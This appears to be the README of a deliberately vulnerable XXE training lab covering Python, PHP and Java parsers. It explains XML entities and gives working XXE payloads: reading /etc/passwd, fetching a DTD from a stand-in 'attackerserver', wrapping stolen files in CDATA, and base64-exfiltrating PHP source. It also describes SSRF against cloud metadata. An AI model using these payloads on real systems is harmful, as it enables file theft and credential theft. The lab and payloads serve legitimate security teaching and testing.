# XXE Study

This repository contains various XXE labs set up for different languages and their different parsers. 
This may alternatively serve as a playground to test with Vulnerability scanners / WAF rules / Secure Configuration settings.

Most updated parsers does not allow external entities by default. In this lab, they are deliberately mis-configured to allow external entities.

## Available environments

| Language | Parser Used                             | App              | Remarks                                                      |
| -------- | --------------------------------------- | ---------------- | ------------------------------------------------------------ |
| Python   | eTree / lxml parser | Python-flask-xxe | By default, the attribute "no_network" that is set is True. Although local file read is possible, this prevents XXE from doing SSRF attacks.<br /><br />See line 55 of app.py |
| PHP      | DOM parser                              | Php-Haboob-xxe   | By default, the parser does not allow entity expansion and disallow external DTD.<br /><br />See line 5 of xxe.php |
| Java     | JAXB                                    | Java-XXE-JAXB    | By default, the parser does not allow external DTD access.<br /><br />See line 104 of XXEApp.java |

## Lab Features

1. **Portable Environment**

   The environment was build via docker containers which allows for easy set up, without having to worry about dependencies.

2. **Incorporated an attacker's file hosting server**

   With the incorporated attacker file server, one can interactively shell in to drop files for the vulnerable server to fetch.

3. **Simulated AWS Metadata Instance**

   This can be used to demonstrate the impact of Server-side Request Forgery (SSRF) via XXE to steal cloud credentials.

## Quick Start

1. Install docker.
2. Install docker compose.
3. Clone the repository:
   `git clone https://github.com/HLOverflow/XXE-study.git`
4. Visit respective `Apps` directory of interest and run:
   `./start.sh`
5. To stop the respective apps, run the `./stop.sh`.

![Set up example](https://raw.githubusercontent.com/HLOverflow/XXE-study/gh-pages/assets/images/python-xxe-setup.gif)

## Intro

**What is XXE?**

Definition by OWASP

>  *XML External Entity* attack is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a <u>weakly configured</u> XML parser**. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

source: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

**Why study XXE?**

1. Ranked #4 in OWASP top 10.

   source: https://owasp.org/www-project-top-ten/

2. Ranked #15 as one of the most impactful vulnerabilities reported on HackerOne Bug Bounty Platform.

   source: https://www.hackerone.com/top-10-vulnerabilities

3. XXE's impact can be related to another impactful well-known vulnerability, Server-side Request Forgery (SSRF).

**Some Impact of XXE**

The following impacts can be demonstrated in the XXE lab set up and some examples have been provided in their respective `example` folders.

1. Arbitrary File Read
   1. Data ex-filtration of source codes / configuration files.
2. Server-side Request Forgery
   1. Exposure of internal services.
   2. Enumeration of internal services via "Port scanning".
   3. Stealing of cloud credentials via Meta-data instances.
3. Denial-of-service

## XML Essentials

### Document type definition (DTD)

**What is a DTD?**

> A DTD defines the valid <u>building blocks</u> of an XML document. It defines the document structure with a <u>list of validated elements and attributes</u>

source: https://en.wikipedia.org/wiki/Document_type_definition

**Syntax**

```xml
<!DOCTYPE rootnode [
	<!ENTITY test "hello world">
	<!ENTITY test2 "hello world2">
]>
```

Note: It has to be defined before any XML document node begin. This means that when exploiting XXE, we cannot inject a DTD in the middle of an XML body. The syntax is also case-sensitive.

Usage of the above definition in the body:

```xml
<sample> &test; &test2;</sample>
```

### ENTITY

1. **Internal Entity**

   Definition:

   ```xml-dtd
   <!ENTITY entityname "Hello">
   <!ENTITY entityname2 'World'>
   ```

   Usage:

   ```xml
   <sample>I would like to say &entityname; &entityname2;</sample>
   ```

   Output:

   ```xml
   <sample>I would like to say Hello World</sample>
   ```

   

2. **External Entity**

   Definition:

   ```xml-dtd
   <!ENTITY includeme SYSTEM "include.xml">
   <!ENTITY includeme2 SYSTEM "http://attackerserver/include.xml">
   ```

   Usage:

   ```xml
   <sample>
       <head>Header</head>
       <first>&includeme;</first>
       <second>&includeme2;</second>
   </sample>
   ```

   include.xml:

   ```xml
   <body>I am to be included.</body>
   ```

   Output:

   ```xml
   <sample>
       <head>Header</head>
       <first><body>I am to be included.</body></first>
       <second><body>I am to be included.</body></second>
   </sample>
   ```

   

3. **Parameter Entity**

   This particular entity is confusing. You may think of this as an entity whose value defines another definition.

   1. **Internal definition**

      Definition:

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable1 'hello world'>">
      ```

      Usage:

      Parameter entities are used **exclusively** within DTDs. They cannot be used directly within XML document. 

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable 'hello world'>">
      %param1;
      <!ENTITY trigger1 "I would like to say &variable; again.">
      ```

      The above definition would expand to the following during run-time:

      ```xml-dtd
      <!ENTITY % param1 "<!ENTITY variable 'hello world'>">
      <!ENTITY variable 'hello world'>
      <!ENTITY trigger1 "I would like to say &variable; again.">
      ```

      2 different usage within the document:

      ```xml
      <sample>
          <first>I would like to say &variable;</first>
          <second>&trigger1;</second>
      </sample>
      ```

      Output:

      ```xml
      <sample>
          <first>I would like to say hello world</first>
          <second>I would like to say hello world again.</second>
      </sample>
      ```

   2. **External definition**
   
      Supposed an application configured a WAF to disallow "/etc/passwd" to be sent to the server, the attacker can avoid using "/etc/passwd" in his request by defining entities outside of the injected XML to be included during run-time. 
   
      External DTD file:
   
      ```xml-dtd
      <!ENTITY callme SYSTEM "/etc/passwd">
      ```
   
      Definition:
   
      ```dtd
      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
      %param1;
      ```
   
      The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
   
      ```dtd
      <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
      <!ENTITY callme SYSTEM "/etc/passwd">
      ```
   
      Vulnerable call from original XML:
   
      ```xml
      <sample>&callme;</sample>
      ```
   
   3. **Internal Subset problem**
   
         Supposed a developer would like to wrap around a parameter entity as follows:
   
         ```xml
         <!DOCTYPE document [
         	<!ENTITY % sample "hello world">
          	<!ENTITY wrapped "<body>%sample;</body>" >
         ]>
         <document>&wrapped;</document>
         ```
   
         The above would face an error *"XMLSyntaxError: PEReferences forbidden in internal subset"*.
   
         In order to define a wrapper, an external entity has to be used.
   
         external.dtd:
   
         ```dtd
         <!ENTITY wrapped "<body>%sample;</body>" >
         ```
   
         document.xml:
   
         ```xml
         <!DOCTYPE document [
         	<!ENTITY % sample "hello world">
          	<!ENTITY % dtd SYSTEM "external.dtd">
         	%dtd;
         ]>
         <document>&wrapped;</document>
         ```
   
         Output:
   
         ```xml
         <document><body>hello world</body></document> 
         ```

4. **First match matters**

   Given the following definition and body:

   ```xml
   <!DOCTYPE r [
    <!ENTITY a "one" >
    <!ENTITY a "two" >
   ]>
   <Sample> &a; </Sample>
   ```

   Output:

   ```xml
   <Sample> one </Sample>
   ```

   When an entity is defined more than once, the XML parser will assume the first match and drop the remaining.

### Observations

XXE File content disclosure has some limitations in type of files that can be disclosed. If a file content contains any of illegal bad characters, the content has a **<u>high likelihood</u>** of not being retrievable. In such cases, the attacker would need to rely on techniques to encode the content before retrieval. The following characters were collected during after some fuzzing.



**Illegal characters**

```
00000000: 0102 0304 0506 0708 0b0c 0e0f 1011 1213  ................
00000010: 1415 1617 1819 1a1b 1c1d 1e1f 263c 8081  ............&<..
00000020: 8283 8485 8687 8889 8a8b 8c8d 8e8f 9091  ................
00000030: 9293 9495 9697 9899 9a9b 9c9d 9e9f a0a1  ................
00000040: a2a3 a4a5 a6a7 a8a9 aaab acad aeaf b0b1  ................
00000050: b2b3 b4b5 b6b7 b8b9 babb bcbd bebf c0c1  ................
00000060: c2c3 c4c5 c6c7 c8c9 cacb cccd cecf d0d1  ................
00000070: d2d3 d4d5 d6d7 d8d9 dadb dcdd dedf e0e1  ................
00000080: e2e3 e4e5 e6e7 e8e9 eaeb eced eeef f0f1  ................
00000090: f2f3 f4f5 f6f7 f8f9 fafb fcfd feff       ..............
```

In the case of "<", this is due to parser scanning for the start of an XML node. If the content does not form a proper XML node, the parser would raise exceptions like "*lxml.etree._raiseParseError XMLSyntaxError: chunk is not well balanced*". A well-form XML `<test></test>` would not face such error.

In the case of "&", this is due to parser scanning for an entity's name. Without a proper entity syntax, the parser would raise exceptions like "*lxml.etree._raiseParseError XMLSyntaxError: xmlParseEntityRef: no name*". A well-formed XML entity syntax like  `&gt;`  would not face such error.

**All safe characters**

```
00000000: 090a 0d20 2122 2324 2527 2829 2a2b 2c2d  ... !"#$%'()*+,-
00000010: 2e2f 3031 3233 3435 3637 3839 3a3b 3d3e  ./0123456789:;=>
00000020: 3f40 4142 4344 4546 4748 494a 4b4c 4d4e  ?@ABCDEFGHIJKLMN
00000030: 4f50 5152 5354 5556 5758 595a 5b5c 5d5e  OPQRSTUVWXYZ[\]^
00000040: 5f60 6162 6364 6566 6768 696a 6b6c 6d6e  _`abcdefghijklmn
00000050: 6f70 7172 7374 7576 7778 797a 7b7c 7d7e  opqrstuvwxyz{|}~
00000060: 7f                                       .
```

Supposed there is a file `illegal.txt` that contains some illegal character:

```
You cannot read me with XXE & < TEST
```

Performing the following attack to directly retrieve that file would result in error:

```xml
<!DOCTYPE root [
	<!ENTITY filecontent SYSTEM "illegal.txt">
]>
<root> &filecontent; </root>
```

So how can we retrieve files with illegal characters like "<" and "&" ?

**Enters CDATA**

Character Data (CDATA) can be used to surround illegal characters to prevent XML parser from parsing them.

```xml
<![CDATA[ You cannot read me with XXE & < TEST ]]>
```

if the file content can be surround by `<![CDATA[ ` and `]]>` , the file content can be retrievable. 

This requires a wrapper and the knowledge of the Internal Subset Problem comes to our rescue.

We can use an external *readillegal.dtd* file with CDATA wrapper being <u>html-entity encoded</u>:

```dtd
<!ENTITY filecontent "&#x3c;&#x21;&#x5b;&#x43;&#x44;&#x41;&#x54;&#x41;&#x5b; %content; &#x5d;&#x5d;&#x3e;" >
```

Injected Definition & body:

```xml
<!DOCTYPE root [
	<!ENTITY % content SYSTEM "illegal.txt">
	<!ENTITY % dtd SYSTEM "http://attackerserver/readillegal.dtd">
 	%dtd;
]>
<root> &filecontent; </root>
```

Output:

```xml
<root> You cannot read me with XXE &amp; &lt; TEST </root> 
```

We can successfully read a file with illegal characters. You may try this out with Python-flask-xxe app that will throw you error messages.

However, if the length of the file with illegal characters is too large, XML parser will attempt to throw *"XMLSyntaxError: Detected an entity reference loop"* as it attempts to stop billion laughter attacks. This can be seen when attempting to steal the source code of `app.py`.

**PHP Wrappers**

The PHP language allows stealing of file content regardless whether they contains illegal characters. This is unique to PHP alone. 

PHP has a pseudo url "php://" that when invoked by PHP programs, can be abused to do base64 encoding of a resource before sending to output stream.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
	<!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<name> &a; </name>
```

## Great Works by Others

### Useful Tools

1. https://www.xxe.sh/: A convenient website to enter your domain name and generates a OOB XXE PoC.
2. [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv): Simplifies setting up of FTP Server to receive OOB XXE via FTP. See usage [here](https://staaldraad.github.io/2016/12/11/xxeftp/).
3. [RequestBins](http://requestbin.net/): A convenient website to capture DNS queries / HTTP requests from vulnerable server.
4. [Ngrok](https://ngrok.com/): A tool to generate temporary domain and forward TCP connections to local machine.

### More Open-source Labs

1. [c0ny1/xxe-lab](https://github.com/c0ny1/xxe-lab): A similar repository in chinese.
2. [jbarone/xxelab](https://github.com/jbarone/xxelab): PHP application with python XXE shell

### Some Blogs on XXE

1. [DepthSecurity: Exploitation](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection): Exploitation technique for PHP web.
2. [SYNACK: Deep Dive](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/): This blog included attack scenario on PHP Expect module & Pass the SOAP.
3. [INFOSEC: XML vulnerabilities still attractive](https://resources.infosecinstitute.com/xml-vulnerabilities-still-attractive-targets-attackers/): This blog included python lxml recommendation.
4. [ambb1: XXE Summary](http://www.ambb1.top/2019/05/13/xxe%E6%80%BB%E7%BB%93/): A chinese blog that attempts to summarise XXE.
5. [Christian Mainka: Detecting and exploiting XXE in SAML Interfaces](https://web-in-security.blogspot.com/2014/11/detecting-and-exploiting-xxe-in-saml.html): Additional settings in Java to prevent XXE and more on SAML XXE.
6. [scriptkidd1e: CVE-2016-4434](https://scriptkidd1e.wordpress.com/2018/07/12/analysis-of-cve-2016-4434-xml-external-entity-vulnerability-on-apache-tika-1-12/): Openoffice XML (OOXML) attack on outdated Apache Tika 1.12

### Payload Cheatsheets

1. [PayloadsAllTheThings/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection): List of community payloads to experiment on.
2. [staaldraad/XXE\_payloads](https://gist.github.com/staaldraad/01415b990939494879b4): More payloads examples
3. [Christian Mainka: XXE cheat sheet](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html): 2016 cheatsheet on XXE.
